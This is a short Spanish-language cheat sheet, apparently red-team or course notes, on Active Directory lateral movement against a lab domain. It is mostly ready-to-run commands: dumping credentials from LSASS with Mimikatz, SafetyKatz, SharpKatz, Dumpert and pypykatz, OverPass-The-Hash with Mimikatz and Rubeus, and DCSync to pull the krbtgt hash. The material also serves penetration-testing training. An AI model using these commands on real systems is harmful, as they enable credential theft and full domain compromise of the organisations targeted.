# Lateral Movement

**Lateral Movement - Mimikatz**

-Se puede usar para dumpear credenciales, tickets, y mas ataques

-Mimikatz se carga en la memoria

-Se necesita privilegios de administrador para dumpear credenciales en la maquina local

Lateral Movement - Extracting Credentials from LSASS

Dumpear credenciales en la maquina local:

`Invoke-Mimikatz -Command '"sekurlsa::ekeys"'`

Usando SafetyKatz (Minidump de lsass y PELoader para ejecutar Mimikatz):

`SafetyKatz.exe "sekurlsa::ekeys"`

Dump creds mediante SharpKatz:

`SharpKatz.exe --Command ekeys`

Dump creds mediante Dumpert:

`rundll32.exe C:\Dumpert\Outflank-Dumpert.dll,Dump`

Dump creds mediante pypykatz:

`pypykatz.exe live lsa`

Desde una maquina linux usando: `Impacket` o `Physmem2profit`

**Lateral Movement - OverPass-The-Hash**

OPTH genera tokens de hashes o keys. 

Con permisos de Administrador: 

`Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator/domain:us.techcorp.local /aes256:<aes256key> /run:powershell.exe"'`

`SafetyKatz.exe "sekurlsa::pth /user:administrator/domain:us.techcorp.local /aes256:<aes256keys> /run:cmd.exe" "exit"`

Los comandos anteriores inician una sesión de PowerShell con un tipo de inicio de sesión 9 (mismo as runas /netonly)

Sin permisos:

`Rubeus.exe asktgt /user:administrator /rc4:<ntlmhash> /ptt`

`Rubeus.exe asktgt /user:administrator /aes256:<aes256keys> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt`

**Lateral Movement - DCSync**

Para extraer credenciales del controlador de dominio sin ejecución de código en él, podemos usar DCSync: Por defecto hacen falta privilegios de administrador del dominio

Para usar la característica DCSync para obtener krbtgt hash, ejecute lo siguiente comando con privilegios de DA para el dominio us:

`Invoke-Mimikatz -Command '"lsadump::dcsync /user:us\krbtgt"'`

`SafetyKatz.exe "lsadump::dcsync /user:us\krbtgt" "exit"`